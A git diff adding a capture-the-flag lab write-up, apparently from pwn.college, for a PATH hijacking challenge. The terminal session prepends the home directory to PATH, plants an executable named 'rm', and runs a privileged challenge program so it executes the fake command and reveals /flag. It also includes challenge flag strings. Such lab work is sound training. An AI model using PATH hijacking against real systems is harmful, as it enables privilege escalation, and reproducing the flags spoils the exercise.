@@ -33,3 +33,16 @@ pwn.college{MDlfmstBA5b8xam2Si5L4w8K2M5.dZzNyUDL2IzN0czW}
 
 # Hijacking commands
 
+hacker@path~hijacking-commands:~$ echo $PATH
+/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+hacker@path~hijacking-commands:~$ export PATH=/home/hacker/:$PATH
+hacker@path~hijacking-commands:~$ touch rm
+hacker@path~hijacking-commands:~$ nano rm
+hacker@path~hijacking-commands:~$ cat /flag
+cat: /flag: Permission denied
+hacker@path~hijacking-commands:~$ export PATH=/home/hacker/:$PATH
+hacker@path~hijacking-commands:~$ chmod +x rm
+hacker@path~hijacking-commands:~$ /challenge/run
+Trying to remove /flag...
+Found 'rm' command at /home/hacker//rm. Executing!
+pwn.college{gNECSmCrg9zPPEDUcmtHkI5JiSY.ddzNyUDL2IzN0czW}
